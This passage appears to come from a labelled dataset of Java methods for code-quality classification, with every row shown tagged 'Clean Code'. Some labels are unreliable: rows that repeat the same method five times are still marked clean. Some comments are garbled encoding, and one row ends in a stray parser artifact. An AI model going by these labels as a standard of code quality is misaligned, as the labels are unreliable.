        if (!theme.isEmpty())         UIManager.getLookAndFeelDefaults().put(THEME_UI_KEY,theme);
      }
 else       if (FlatPropertiesLaf.class.getName().equals(lafClassName)) {
        String theme=state.get(KEY_LAF_THEME,"""");
        if (theme.startsWith(FILE_PREFIX)) {
          File themeFile=new File(theme.substring(FILE_PREFIX.length()));
          String themeName=StringUtils.removeTrailing(themeFile.getName(),"".properties"");
          FlatLaf.setup(new FlatPropertiesLaf(themeName,themeFile));
        }
 else         FlatLightLaf.setup();
        if (!theme.isEmpty())         UIManager.getLookAndFeelDefaults().put(THEME_UI_KEY,theme);
      }
 else       UIManager.setLookAndFeel(lafClassName);
    }
  }
 catch (  Throwable ex) {
    LoggingFacade.INSTANCE.logSevere(null,ex);
    FlatLightLaf.setup();
  }
  UIManager.addPropertyChangeListener(e -> {
    if (""lookAndFeel"".equals(e.getPropertyName()))     state.put(KEY_LAF,UIManager.getLookAndFeel().getClass().getName());
  }
);
}",0,Clean Code
"/** 
 * Inserts view into the wrapper.
 */
public void wrap(View view){
  if (!mInitialized || mWrappedView != null) {
    throw new IllegalStateException();
  }
  ViewGroup.LayoutParams lp=view.getLayoutParams();
  if (lp != null) {
    ViewGroup.LayoutParams wrapped_lp=new FrameLayout.LayoutParams(lp.width,lp.height);
    lp.width=lp.width == LayoutParams.MATCH_PARENT ? LayoutParams.MATCH_PARENT : LayoutParams.WRAP_CONTENT;
    lp.height=lp.height == LayoutParams.MATCH_PARENT ? LayoutParams.MATCH_PARENT : LayoutParams.WRAP_CONTENT;
    this.setLayoutParams(lp);
    addView(view,wrapped_lp);
  }
 else {
    addView(view);
  }
  if (mRoundedCorners && mShadowType != SHADOW_DYNAMIC) {
    RoundedRectHelper.setClipToRoundedOutline(this,true);
  }
  mWrappedView=view;
}
",0,Clean Code
"private Properties.Comment commentFromLine(String line,String prefix,Properties.Comment.Delimiter delimiter){
  StringBuilder prefixBuilder=new StringBuilder(prefix);
  StringBuilder message=new StringBuilder();
  boolean inComment=false;
  int state=0;
  for (  char c : line.toCharArray()) {
switch (state) {
case 0:
      if (Character.isWhitespace(c)) {
        prefixBuilder.append(c);
        break;
      }
    state++;
case 1:
  if ((c == '#' || c == '!') && !inComment) {
    inComment=true;
    continue;
  }
 else   if (!Character.isWhitespace(c)) {
    message.append(c);
    break;
  }
state++;
case 2:
if (!Character.isWhitespace(c)) {
message.append(c);
state--;
break;
}
 else {
message.append(c);
}
}
}
return new Properties.Comment(randomId(),prefixBuilder.toString(),Markers.EMPTY,delimiter,message.toString());
}",0,Clean Code
"public static String formatAttributeMap(final HashMap<String,String> attributeMap){
  final StringBuilder builder=new StringBuilder();
  builder.append(DICTIONARY_TAG + ""="");
  if (attributeMap.containsKey(DictionaryHeader.DICTIONARY_ID_KEY)) {
    builder.append(attributeMap.get(DictionaryHeader.DICTIONARY_ID_KEY));
  }
  for (  final String key : attributeMap.keySet()) {
    if (key.equals(DictionaryHeader.DICTIONARY_ID_KEY)) {
      continue;
    }
    final String value=attributeMap.get(key);
    builder.append("","" + key + ""=""+ value);
  }
  builder.append(""\n"");
  return builder.toString();
}
",0,Clean Code
"private boolean waterShouldBeSolid(){
  if (EntityUtils.getGameMode(mc.player) == GameMode.SPECTATOR || mc.player.getAbilities().flying)   return false;
  if (mc.player.getVehicle() != null) {
    EntityType<?> vehicle=mc.player.getVehicle().getType();
    if (vehicle == EntityType.BOAT || vehicle == EntityType.CHEST_BOAT)     return false;
  }
  if (Modules.get().get(Flight.class).isActive())   return false;
  if (dipIfBurning.get() && mc.player.isOnFire())   return false;
  if (dipOnSneakWater.get() && mc.options.sneakKey.isPressed())   return false;
  if (dipOnFallWater.get() && mc.player.fallDistance > dipFallHeightWater.get())   return false;
  return waterMode.get() == Mode.Solid;
}
",0,Clean Code
"public static void register(){
  ActivityThread activityThread=ActivityThread.currentActivityThread();
  if (activityThread == null) {
    LOGGER.w(""ActivityThread is null"");
    return;
  }
  IntentFilter intentFilter=new IntentFilter();
  intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED);
  intentFilter.addAction(Intent.ACTION_PACKAGE_REMOVED);
  intentFilter.addAction(Intent.ACTION_PACKAGE_FULLY_REMOVED);
  intentFilter.addDataScheme(""package"");
  Handler handler=new Handler(Looper.getMainLooper());
  try {
    Refine.<ContextHidden>unsafeCast(ActivityThread.currentActivityThread().getSystemContext()).registerReceiverAsUser(RECEIVER,Refine.unsafeCast(UserHandleHidden.ALL),intentFilter,null,handler);
    LOGGER.d(""register package receiver"");
  }
 catch (  Throwable e) {
    LOGGER.w(""registerReceiver failed"",e);
  }
}
",0,Clean Code
"public void saveFinalTransaction(ActionEvent event){
  Stage window=new Stage();
  FileChooser fileChooser=new FileChooser();
  fileChooser.setTitle(""Save Final Transaction"");
  if (headersForm.getName() != null && !headersForm.getName().isEmpty()) {
    fileChooser.setInitialFileName(headersForm.getName().replace("".psbt"","""") + "".txn"");
  }
  AppServices.moveToActiveWindowScreen(window,800,450);
  File file=fileChooser.showSaveDialog(window);
  if (file != null) {
    try {
      try (PrintWriter writer=new PrintWriter(file,StandardCharsets.UTF_8)){
        Transaction finalTx=headersForm.getPsbt().extractTransaction();
        writer.print(Utils.bytesToHex(finalTx.bitcoinSerialize()));
      }
     }
 catch (    IOException e) {
      log.error(""Error saving transaction"",e);
      AppServices.showErrorDialog(""Error saving transaction"",""Cannot write to "" + file.getAbsolutePath());
    }
  }
}",0,Clean Code
"private void applyCrossKey(View v,MotionEvent e){
  int[] boardPos=new int[2];
  int[] touchPos=new int[2];
  int[] shiftPos=new int[2];
  int buttonWidth=v.getWidth();
  int buttonheight=v.getHeight();
  crossKeyboard.getLocationOnScreen(boardPos);
  touchPos[0]=(int)e.getRawX();
  touchPos[1]=(int)e.getRawY();
  shiftPos[0]=touchPos[0] - boardPos[0];
  shiftPos[1]=touchPos[1] - boardPos[1];
  int location;
  if (shiftPos[0] < buttonWidth && shiftPos[0] >= 0) {
    if (shiftPos[1] < buttonheight && shiftPos[1] >= 0) {
      location=1;
    }
 else     if (shiftPos[1] <= buttonheight * 2 && shiftPos[1] >= buttonheight) {
      location=4;
    }
 else     if (shiftPos[1] > buttonheight * 2 && shiftPos[1] <= buttonheight * 3) {
      location=7;
    }
 else {
      location=0;
    }
  }
 else   if (shiftPos[0] <= buttonWidth * 2 && shiftPos[0] >= buttonWidth) {
    if (shiftPos[1] < buttonheight && shiftPos[1] >= 0) {
      location=2;
    }
 else     if (shiftPos[1] <= buttonheight * 2 && shiftPos[1] >= buttonheight) {
      location=5;
    }
 else     if (shiftPos[1] > buttonheight * 2 && shiftPos[1] <= buttonheight * 3) {
      location=8;
    }
 else {
      location=0;
    }
  }
 else   if (shiftPos[0] > buttonWidth * 2 && shiftPos[0] <= buttonWidth * 3) {
    if (shiftPos[1] < buttonheight && shiftPos[1] >= 0) {
      location=3;
    }
 else     if (shiftPos[1] <= buttonheight * 2 && shiftPos[1] >= buttonheight) {
      location=6;
    }
 else     if (shiftPos[1] > buttonheight * 2 && shiftPos[1] <= buttonheight * 3) {
      location=9;
    }
 else {
      location=0;
    }
  }
 else {
    location=0;
  }
  uiUpdate(location,e);
  makeKeyEvent(location,e);
}",0,Clean Code
"/** 
 * Escapes a string for any characters that may be suspicious for a file or directory name. <p> Concretely this does a sort of URL-encoding except it will encode everything that's not alphanumeric or underscore. (true URL-encoding leaves alone characters like '*', which we cannot allow here)
 */
public static String replaceFileNameDangerousCharacters(final String name){
  final StringBuilder sb=new StringBuilder();
  final int nameLength=name.length();
  for (int i=0; i < nameLength; i=name.offsetByCodePoints(i,1)) {
    final int codePoint=name.codePointAt(i);
    if (DictionaryInfoUtils.isFileNameCharacter(codePoint)) {
      sb.appendCodePoint(codePoint);
    }
 else {
      sb.append(String.format(Locale.US,""%%%1$0"" + MAX_HEX_DIGITS_FOR_CODEPOINT + ""x"",codePoint));
    }
  }
  return sb.toString();
}",0,Clean Code
"public void syncRemote2Local(Long appPackageId,Long teamId,String appName,String user,Long display,int onSale) throws Exception {
  List<String> subFilePathList=downloadRemote(appPackageId);
  String metaFilePath=subFilePathList.get(0);
  String dataFilePath=subFilePathList.get(1);
  AppPackage appPackage=createAppAndComponent(metaFilePath,teamId,appName,user,display);
  importData(appPackage,dataFilePath,user);
  appPackage.setId(null);
  appPackage.setGmtCreate(System.currentTimeMillis() / 1000);
  appPackage.setGmtModified(System.currentTimeMillis() / 1000);
  appPackage.setCreator(user);
  appPackage.setLastModifier(user);
  appPackage.setAppPackageTaskId(null);
  appPackage.setOnSale(onSale);
  appPackageRepository.saveAndFlush(appPackage);
}",0,Clean Code
"/** 
 * 璇ュ畾鏃朵换鍔＄敤浜庡皢绗﹀悎鏉′欢鐨勭鏉�鍟嗗搧娣诲姞鍒皉edis
 */
@Scheduled(fixedRate=5000) public void addItemToRedis(){
  List<InstantBuyItem> items=this.instantBuyDao.selectItems(new Date());
  for (  InstantBuyItem item : items) {
    String itemId=item.getItemId();
    Date startTime=item.getStartTime();
    Date endTime=item.getEndTime();
    Date nowTime=new Date();
    if (nowTime.compareTo(endTime) > 0) {
      this.redisTemplate.delete(""INSTANT_"" + itemId);
      continue;
    }
    DateFormat formatter=new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"");
    this.redisTemplate.opsForHash().put(""INSTANT_"" + itemId,""number"",item.getNumber().toString());
    this.redisTemplate.opsForHash().put(""INSTANT_"" + itemId,""start_time"",formatter.format(startTime));
    this.redisTemplate.opsForHash().put(""INSTANT_"" + itemId,""end_time"",formatter.format(endTime));
  }
}",0,Clean Code
"@Override public void render(GuiGraphics guiGraphics,int mouseX,int mouseY,float tickDelta,boolean hovered){
  this.updateRenderParams(35);
  if (!hovered && !isFocused()) {
    if (usedKeyboard) {
      usedKeyboard=false;
      mouseDown=false;
    }
    this.renderOptionWithValue(guiGraphics,false,(float)valueIndex / (valueCount - 1),PREVIEW_SLIDER_WIDTH);
  }
 else {
    this.renderSlider(guiGraphics);
  }
  if (usedKeyboard) {
    if (Screen.hasShiftDown()) {
      renderTooltip(guiGraphics,SET_TO_DEFAULT,bounds.getBoundInDirection(ScreenDirection.RIGHT),bounds.position().y(),hovered);
    }
 else     if (!this.screen.isDisplayingComment()) {
      renderTooltip(guiGraphics,this.unmodifiedLabel,bounds.getBoundInDirection(ScreenDirection.RIGHT),bounds.position().y(),hovered);
    }
  }
 else {
    if (Screen.hasShiftDown()) {
      renderTooltip(guiGraphics,SET_TO_DEFAULT,mouseX,mouseY,hovered);
    }
 else     if (!this.screen.isDisplayingComment()) {
      renderTooltip(guiGraphics,this.unmodifiedLabel,mouseX,mouseY,hovered);
    }
  }
  if (usedKeyboard) {
    if (!isFocused()) {
      usedKeyboard=false;
      this.onReleased();
    }
  }
  if (this.mouseDown && !usedKeyboard) {
    if (!hovered) {
      this.onReleased();
    }
    whileDragging(mouseX);
  }
}",0,Clean Code
"private static float getHeightOffset(Entity passenger){
  boolean isBaby;
switch (passenger.getDefinition().entityType()) {
case ALLAY:
    return 0.4f;
case SKELETON:
  return -0.6f;
case ARMOR_STAND:
if (((ArmorStandEntity)passenger).isMarker()) {
  return 0.0f;
}
 else {
  return 0.1f;
}
case ENDERMITE:
return 0.1f;
case PIGLIN:
isBaby=passenger.getFlag(EntityFlag.BABY);
return isBaby ? -0.05f : -0.45f;
case DROWNED:
isBaby=passenger.getFlag(EntityFlag.BABY);
return isBaby ? 0.0f : -0.45f;
case EVOKER:
return -0.45f;
case PLAYER:
return -0.35f;
case SHULKER:
Entity vehicle=passenger.getVehicle();
if (vehicle instanceof BoatEntity || vehicle.getDefinition() == EntityDefinitions.MINECART) {
return 0.1875f - getMountedHeightOffset(vehicle);
}
}
if (passenger instanceof AnimalEntity) {
return 0.14f;
}
return 0f;
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.classification.sgd.protos.ClassificationLinearSGDProto)) {
    return super.equals(obj);
  }
  org.tribuo.classification.sgd.protos.ClassificationLinearSGDProto other=(org.tribuo.classification.sgd.protos.ClassificationLinearSGDProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (hasParams() != other.hasParams())   return false;
  if (hasParams()) {
    if (!getParams().equals(other.getParams()))     return false;
  }
  if (hasNormalizer() != other.hasNormalizer())   return false;
  if (hasNormalizer()) {
    if (!getNormalizer().equals(other.getNormalizer()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public void handle(final RequestContext context){
  final Request request=context.getRequest();
  final JSONObject requestJSONObject=context.requestJSON();
  final String userName=requestJSONObject.optString(User.USER_NAME);
  if (StringUtils.isBlank(userName) || UserExt.COM_BOT_NAME.equals(userName)) {
    context.renderJSON(new JSONObject().put(Keys.MSG,langPropsService.get(""notFoundUserLabel"")));
    context.abort();
    return;
  }
  final int amount=requestJSONObject.optInt(Common.AMOUNT);
  if (amount < 1 || amount > 5000) {
    context.renderJSON(new JSONObject().put(Keys.MSG,langPropsService.get(""amountInvalidLabel"")));
    context.abort();
    return;
  }
  JSONObject toUser=userQueryService.getUserByName(userName);
  if (null == toUser) {
    context.renderJSON(new JSONObject().put(Keys.MSG,langPropsService.get(""notFoundUserLabel"")));
    context.abort();
    return;
  }
  if (UserExt.USER_STATUS_C_VALID != toUser.optInt(UserExt.USER_STATUS)) {
    context.renderJSON(new JSONObject().put(Keys.MSG,langPropsService.get(""userStatusInvalidLabel"")));
    context.abort();
    return;
  }
  request.setAttribute(Common.TO_USER,toUser);
  final JSONObject currentUser=Sessions.getUser();
  if (UserExt.USER_STATUS_C_VALID != currentUser.optInt(UserExt.USER_STATUS)) {
    context.renderJSON(new JSONObject().put(Keys.MSG,langPropsService.get(""userStatusInvalidLabel"")));
    context.abort();
    return;
  }
  if (currentUser.optString(User.USER_NAME).equals(toUser.optString(User.USER_NAME))) {
    context.renderJSON(new JSONObject().put(Keys.MSG,langPropsService.get(""cannotTransferSelfLabel"")));
    context.abort();
    return;
  }
  final int balanceMinLimit=Symphonys.POINT_TRANSER_MIN;
  final int balance=currentUser.optInt(UserExt.USER_POINT);
  if (balance - amount < balanceMinLimit) {
    context.renderJSON(new JSONObject().put(Keys.MSG,langPropsService.get(""insufficientBalanceLabel"")));
    context.abort();
    return;
  }
  String memo=StringUtils.trim(requestJSONObject.optString(Pointtransfer.MEMO));
  if (128 < StringUtils.length(memo)) {
    context.renderJSON(new JSONObject().put(Keys.MSG,langPropsService.get(""memoTooLargeLabel"")));
    context.abort();
    return;
  }
  memo=Jsoup.clean(memo,Safelist.none());
  request.setAttribute(Pointtransfer.MEMO,memo);
  context.handle();
}",0,Clean Code
"/** 
 * @param request
 * @param userName
 * @return
 */
@RequestMapping(value=""auth/user/list"",method=RequestMethod.GET) @ResponseBody public TeslaResult list(HttpServletRequest request,@RequestParam String userName){
  List<UserDO> list=teslaUserService.selectByName(userName);
  return buildSuccessTeslaResult(list);
}
/** 
 * 鏌ヨ鏌愪釜搴旂敤涓嬫墍鏈夊凡缁忓紑鍚殑鏈嶅姟鍏冩暟鎹紙鍚儴鍒嗗紑鍚級
 * @param userRequest
 * @return
 */
@PostMapping(""auth/tesla/user/list"") @ResponseBody public com.alibaba.tesla.common.base.TeslaResult list(HttpServletRequest request,@Valid @RequestBody TeslaUserListRequest userRequest,BindingResult bindingResult){
  if (bindingResult.hasErrors()) {
    return TeslaResultBuilder.failureResult(400,null,bindingResult.getFieldError().getDefaultMessage());
  }
  PageInfo<UserDO> pageData=teslaUserService.listUserWithPage(userRequest.getPage(),userRequest.getSize(),userRequest.getLoginName());
  Map<String,Object> ret=new HashMap<>();
  ret.put(""list"",pageData.getList());
  ret.put(""total"",pageData.getTotal());
  return TeslaResultBuilder.successResult(ret);
}",0,Clean Code
"/** 
 * Tests  {@link Parameters} {@link android.os.Parcelable} implementation. 
 */
@Test public void testParametersParcelable(){
  SparseArray<Map<TrackGroupArray,SelectionOverride>> selectionOverrides=new SparseArray<>();
  Map<TrackGroupArray,SelectionOverride> videoOverrides=new HashMap<>();
  videoOverrides.put(new TrackGroupArray(VIDEO_TRACK_GROUP),new SelectionOverride(0,1));
  selectionOverrides.put(2,videoOverrides);
  SparseBooleanArray rendererDisabledFlags=new SparseBooleanArray();
  rendererDisabledFlags.put(3,true);
  Parameters parametersToParcel=new Parameters(0,1,2,3,false,true,false,4,5,true,""en"",6,7,false,true,false,true,""de"",C.ROLE_FLAG_CAPTION,true,8,false,true,false,C.AUDIO_SESSION_ID_UNSET,selectionOverrides,rendererDisabledFlags);
  Parcel parcel=Parcel.obtain();
  parametersToParcel.writeToParcel(parcel,0);
  parcel.setDataPosition(0);
  Parameters parametersFromParcel=Parameters.CREATOR.createFromParcel(parcel);
  assertThat(parametersFromParcel).isEqualTo(parametersToParcel);
  parcel.recycle();
}",0,Clean Code
"private List<ErpSaleOutItemDO> validateSaleOutItems(List<ErpSaleOutSaveReqVO.Item> list){
  List<ErpProductDO> productList=productService.validProductList(convertSet(list,ErpSaleOutSaveReqVO.Item::getProductId));
  Map<Long,ErpProductDO> productMap=convertMap(productList,ErpProductDO::getId);
  return convertList(list,o -> BeanUtils.toBean(o,ErpSaleOutItemDO.class,item -> {
    item.setProductUnitId(productMap.get(item.getProductId()).getUnitId());
    item.setTotalPrice(MoneyUtils.priceMultiply(item.getProductPrice(),item.getCount()));
    if (item.getTotalPrice() == null) {
      return;
    }
    if (item.getTaxPercent() != null) {
      item.setTaxPrice(MoneyUtils.priceMultiplyPercent(item.getTotalPrice(),item.getTaxPercent()));
    }
  }
));
}
",0,Clean Code
"protected GeneratedCriteria(){
  super();
  criteria=new ArrayList<>();
}
protected GeneratedCriteria(){
  super();
  criteria=new ArrayList<>();
}
protected GeneratedCriteria(){
  super();
  criteria=new ArrayList<>();
}
protected GeneratedCriteria(){
  super();
  criteria=new ArrayList<>();
}
protected GeneratedCriteria(){
  super();
  criteria=new ArrayList<>();
}
",0,Clean Code
"@Override public ExecuteRequest jobToExecuteRequest() throws EntranceErrorException {
  Map<String,String> starupMapTmp=new HashMap<>();
  Map<String,Object> starupMapOri=TaskUtils.getStartupMap(getParams());
  JobRequest jobRequest=getJobRequest();
  if (starupMapOri.isEmpty()) {
    TaskUtils.addStartupMap(getParams(),starupMapOri);
  }
  if (!starupMapOri.containsKey(JobRequestConstants.JOB_REQUEST_LIST())) {
    starupMapOri.put(JobRequestConstants.JOB_ID(),String.valueOf(jobRequest.getId()));
  }
  for (  Map.Entry<String,Object> entry : starupMapOri.entrySet()) {
    if (null != entry.getKey() && null != entry.getValue()) {
      starupMapTmp.put(entry.getKey(),entry.getValue().toString());
    }
  }
  Map<String,Object> runtimeMapOri=TaskUtils.getRuntimeMap(getParams());
  if (null == runtimeMapOri || runtimeMapOri.isEmpty()) {
    TaskUtils.addRuntimeMap(getParams(),new HashMap<>());
    runtimeMapOri=TaskUtils.getRuntimeMap(getParams());
  }
  if (!runtimeMapOri.containsKey(JobRequestConstants.JOB_ID())) {
    runtimeMapOri.put(JobRequestConstants.JOB_ID(),String.valueOf(jobRequest.getId()));
  }
  Map<String,String> runtimeMapTmp=new HashMap<>();
  for (  Map.Entry<String,Object> entry : runtimeMapOri.entrySet()) {
    if (null != entry.getKey() && null != entry.getValue()) {
      runtimeMapTmp.put(entry.getKey(),entry.getValue().toString());
    }
  }
  String resultSetPathRoot=GovernanceCommonConf.RESULT_SET_STORE_PATH().getValue(runtimeMapTmp);
  if (!runtimeMapTmp.containsKey(GovernanceCommonConf.RESULT_SET_STORE_PATH().key())) {
    String resultParentPath=CommonLogPathUtils.getResultParentPath(jobRequest);
    CommonLogPathUtils.buildCommonPath(resultParentPath);
    resultSetPathRoot=CommonLogPathUtils.getResultPath(jobRequest);
  }
  Map<String,Object> jobMap=new HashMap<String,Object>();
  jobMap.put(RequestTask$.MODULE$.RESULT_SET_STORE_PATH(),resultSetPathRoot);
  runtimeMapOri.put(QueryParams$.MODULE$.JOB_KEY(),jobMap);
  jobRequest.setResultLocation(resultSetPathRoot);
  EntranceExecuteRequest executeRequest=new EntranceExecuteRequest(this);
  List<Label<?>> labels=new ArrayList<Label<?>>(jobRequest.getLabels());
  executeRequest.setLabels(labels);
  return executeRequest;
}
",0,Clean Code
"public static void setColor(int key,int color,boolean useDefault){
  if (key == key_chat_wallpaper || key == key_chat_wallpaper_gradient_to1 || key == key_chat_wallpaper_gradient_to2 || key == key_chat_wallpaper_gradient_to3 || key == key_windowBackgroundWhite || key == key_windowBackgroundGray || key == key_actionBarDefault || key == key_actionBarDefaultArchived) {
    color=0xff000000 | color;
  }
  if (useDefault) {
    currentColors.delete(key);
  }
 else {
    currentColors.put(key,color);
  }
  if (key == key_chat_selectedBackground) {
    applyChatMessageSelectedBackgroundColor();
  }
 else   if (key == key_chat_serviceBackground || key == key_chat_serviceBackgroundSelected) {
    applyChatServiceMessageColor();
  }
 else   if (key == key_chat_wallpaper || key == key_chat_wallpaper_gradient_to1 || key == key_chat_wallpaper_gradient_to2 || key == key_chat_wallpaper_gradient_to3 || key == key_chat_wallpaper_gradient_rotation) {
    reloadWallpaper(true);
  }
 else   if (key == key_actionBarDefault) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
      NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.needCheckSystemBarColors);
    }
  }
 else   if (key == key_windowBackgroundGray) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
      NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.needCheckSystemBarColors);
    }
  }
}",0,Clean Code
"public Map<ComponentInfo,Integer> getAllComponents(){
  if (mAllComponents == null) {
    Map<ComponentInfo,Integer> components=new LinkedHashMap<>();
    if (mPackageInfo.activities != null) {
      for (      ActivityInfo info : mPackageInfo.activities) {
        components.put(info,ComponentsOption.COMPONENT_TYPE_ACTIVITY);
      }
    }
    if (mPackageInfo.services != null) {
      for (      ServiceInfo info : mPackageInfo.services) {
        components.put(info,ComponentsOption.COMPONENT_TYPE_SERVICE);
      }
    }
    if (mPackageInfo.receivers != null) {
      for (      ActivityInfo info : mPackageInfo.receivers) {
        components.put(info,ComponentsOption.COMPONENT_TYPE_RECEIVER);
      }
    }
    if (mPackageInfo.providers != null) {
      for (      ProviderInfo info : mPackageInfo.providers) {
        components.put(info,ComponentsOption.COMPONENT_TYPE_PROVIDER);
      }
    }
    mAllComponents=components;
  }
  return mAllComponents;
}
",0,Clean Code
"private float getBreakDamage(Entity entity,boolean checkCrystalAge){
  if (!(entity instanceof EndCrystalEntity))   return 0;
  if (onlyBreakOwn.get() && !placedCrystals.contains(entity.getId()))   return 0;
  if (removed.contains(entity.getId()))   return 0;
  if (attemptedBreaks.get(entity.getId()) > breakAttempts.get())   return 0;
  if (checkCrystalAge && entity.age < ticksExisted.get())   return 0;
  if (isOutOfRange(entity.getPos(),entity.getBlockPos(),false))   return 0;
  blockPos.set(entity.getBlockPos()).move(0,-1,0);
  float selfDamage=DamageUtils.crystalDamage(mc.player,entity.getPos(),predictMovement.get(),blockPos);
  if (selfDamage > maxDamage.get() || (antiSuicide.get() && selfDamage >= EntityUtils.getTotalHealth(mc.player)))   return 0;
  float damage=getDamageToTargets(entity.getPos(),blockPos,true,false);
  boolean shouldFacePlace=shouldFacePlace();
  double minimumDamage=shouldFacePlace ? Math.min(minDamage.get(),1.5d) : minDamage.get();
  if (damage < minimumDamage)   return 0f;
  return damage;
}",0,Clean Code
"/** 
 * Get a ColorDimmer for a given color.  Only the RGB values are used; the alpha channel is ignored in color. Subsequent calls to this method with the same color value will return the same cache.
 * @param color The color to use for the color filters.
 * @return A cache of ColorFilters at different alpha levels for the color.
 */
public static ColorFilterCache getColorFilterCache(int color){
  final int r=Color.red(color);
  final int g=Color.green(color);
  final int b=Color.blue(color);
  color=Color.rgb(r,g,b);
  ColorFilterCache filters=sColorToFiltersMap.get(color);
  if (filters == null) {
    filters=new ColorFilterCache(r,g,b);
    sColorToFiltersMap.put(color,filters);
  }
  return filters;
}
",0,Clean Code
"private CRFModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private CRFModelProto(){
  confidenceType_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@7d4f04f",0,Clean Code
"/** 
 * @param castContext The context from which the cast session is obtained.
 */
public CastPlayer(CastContext castContext){
  this.castContext=castContext;
  timelineTracker=new CastTimelineTracker();
  period=new Timeline.Period();
  statusListener=new StatusListener();
  seekResultCallback=new SeekResultCallback();
  listeners=new CopyOnWriteArrayList<>();
  notificationsBatch=new ArrayList<>();
  ongoingNotificationsTasks=new ArrayDeque<>();
  SessionManager sessionManager=castContext.getSessionManager();
  sessionManager.addSessionManagerListener(statusListener,CastSession.class);
  CastSession session=sessionManager.getCurrentCastSession();
  remoteMediaClient=session != null ? session.getRemoteMediaClient() : null;
  playbackState=STATE_IDLE;
  repeatMode=REPEAT_MODE_OFF;
  currentTimeline=CastTimeline.EMPTY_CAST_TIMELINE;
  currentTrackGroups=TrackGroupArray.EMPTY;
  currentTrackSelection=EMPTY_TRACK_SELECTION_ARRAY;
  pendingSeekWindowIndex=C.INDEX_UNSET;
  pendingSeekPositionMs=C.TIME_UNSET;
  updateInternalState();
}
",0,Clean Code
"private void updateEsField(CrmEnum crmEnum,List<Integer> ids,List<Long> members,boolean isRemove){
  if (ids.size() == 0 || members.size() == 0) {
    return;
  }
  try {
    for (    Integer id : ids) {
      UpdateRequest updateRequest=new UpdateRequest(crmEnum.getIndex(),""_doc"",id.toString());
      String script;
      if (isRemove) {
        script=""if (ctx._source.teamMemberIds== null) {ctx._source.teamMemberIds=[]}else{ctx._source.teamMemberIds.removeAll(params.value)}"";
      }
 else {
        script=""if (ctx._source.teamMemberIds== null) {ctx._source.teamMemberIds=params.value}else{ctx._source.teamMemberIds.addAll(params.value)}"";
      }
      updateRequest.script(new Script(ScriptType.INLINE,""painless"",script,Collections.singletonMap(""value"",members)));
      restTemplate.getClient().update(updateRequest,RequestOptions.DEFAULT);
    }
    restTemplate.refresh(crmEnum.getIndex());
  }
 catch (  Exception ex) {
    log.error(""娣诲姞鍥㈤槦鎴愬憳寮傚父:"",ex);
  }
}",0,Clean Code
"private static boolean isWellFormedType0(JavaType type,Set<JavaType> seen){
  if (!seen.add(type)) {
    return true;
  }
  if (type instanceof JavaType.Parameterized) {
    JavaType.Parameterized parameterized=(JavaType.Parameterized)type;
    return isWellFormedType(parameterized.getType(),seen) && parameterized.getTypeParameters().stream().allMatch(it -> isWellFormedType(it,seen));
  }
 else   if (type instanceof JavaType.Array) {
    JavaType.Array arr=(JavaType.Array)type;
    return isWellFormedType(arr.getElemType(),seen);
  }
 else   if (type instanceof JavaType.GenericTypeVariable) {
    JavaType.GenericTypeVariable gen=(JavaType.GenericTypeVariable)type;
    return gen.getBounds().stream().allMatch(it -> isWellFormedType(it,seen));
  }
 else   if (type instanceof JavaType.Variable) {
    JavaType.Variable var=(JavaType.Variable)type;
    return isWellFormedType(var.getType(),seen) && isWellFormedType(var.getOwner(),seen);
  }
 else   if (type instanceof JavaType.MultiCatch) {
    JavaType.MultiCatch mc=(JavaType.MultiCatch)type;
    return mc.getThrowableTypes().stream().allMatch(it -> isWellFormedType(it,seen));
  }
 else   if (type instanceof JavaType.Method) {
    JavaType.Method m=(JavaType.Method)type;
    return isWellFormedType(m.getReturnType(),seen) && isWellFormedType(m.getDeclaringType(),seen) && m.getParameterTypes().stream().allMatch(it -> isWellFormedType(it,seen));
  }
  return true;
}",0,Clean Code
"public void removeStorageFromWorld(){
  valid=false;
  if (blockEntity == null)   return;
  if (blockEntity instanceof ChestBlockEntity) {
    CompoundTag tag=blockEntity.saveWithFullMetadata();
    if (tag.contains(""LootTable"",8))     return;
    handler=new ItemStackHandler(((ChestBlockEntity)blockEntity).getContainerSize());
    NonNullList<ItemStack> items=NonNullList.withSize(handler.getSlots(),ItemStack.EMPTY);
    ContainerHelper.loadAllItems(tag,items);
    for (int i=0; i < items.size(); i++)     handler.setStackInSlot(i,items.get(i));
    valid=true;
    return;
  }
  IItemHandler beHandler=blockEntity.getCapability(ForgeCapabilities.ITEM_HANDLER).orElse(dummyHandler);
  if (beHandler == dummyHandler)   return;
  if (blockEntity instanceof ItemVaultBlockEntity) {
    handler=((ItemVaultBlockEntity)blockEntity).getInventoryOfBlock();
    valid=true;
    return;
  }
  if (beHandler instanceof ItemStackHandler) {
    handler=(ItemStackHandler)beHandler;
    valid=true;
    return;
  }
  if (beHandler instanceof IItemHandlerModifiable) {
    IItemHandlerModifiable inv=(IItemHandlerModifiable)beHandler;
    handler=new ItemStackHandler(beHandler.getSlots());
    for (int slot=0; slot < handler.getSlots(); slot++) {
      handler.setStackInSlot(slot,inv.getStackInSlot(slot));
      inv.setStackInSlot(slot,ItemStack.EMPTY);
    }
    valid=true;
    return;
  }
}",0,Clean Code
"public Criteria andBuildInNotIn(List<Boolean> values){
  addCriterion(""build_in not in"",values,""buildIn"");
  return (Criteria)this;
}
public Criteria andBuildInNotIn(List<Boolean> values){
  addCriterion(""build_in not in"",values,""buildIn"");
  return (Criteria)this;
}
public Criteria andBuildInNotIn(List<Boolean> values){
  addCriterion(""build_in not in"",values,""buildIn"");
  return (Criteria)this;
}
public Criteria andBuildInNotIn(List<Boolean> values){
  addCriterion(""build_in not in"",values,""buildIn"");
  return (Criteria)this;
}
public Criteria andBuildInNotIn(List<Boolean> values){
  addCriterion(""build_in not in"",values,""buildIn"");
  return (Criteria)this;
}
",0,Clean Code
